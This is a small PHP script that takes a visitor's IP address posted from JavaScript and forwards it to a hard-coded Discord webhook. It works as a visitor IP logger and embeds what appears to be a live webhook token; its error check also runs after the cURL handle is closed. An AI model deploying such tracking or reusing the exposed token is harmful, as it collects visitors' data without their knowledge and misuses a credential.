<?php
// Retrieve IP address from JavaScript POST request
$data = json_decode(file_get_contents('php://input'), true);
$ip = $data['ip'];

// Discord webhook URL
$webhook_url = 'https://discord.com/api/webhooks/1250524973379096659/uSXh4YeKwif6MoNQG5LZLZDiKgWanVSPVfFMTGRxFOOCXFLFbEJ79LLAsvm1ukIBDeVm';

// Message to send to Discord
$message = "New visitor IP address: $ip";

// Prepare data to send to Discord webhook
$data = array('content' => $message);

// Use cURL to send data to Discord webhook
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);



// Check for cURL errors
if (curl_errno($ch)) {
    http_response_code(500);
    echo json_encode(array('error' => 'cURL error: ' . curl_error($ch)));
    exit;
}

// Check response from Discord webhook
if (!$response) {
    http_response_code(500);
    echo json_encode(array('error' => 'Failed to send IP address to Discord.'));
    exit;
}

// Send success response
http_response_code(200);
echo json_encode(array('message' => 'IP address sent to Discord successfully.'));
?>
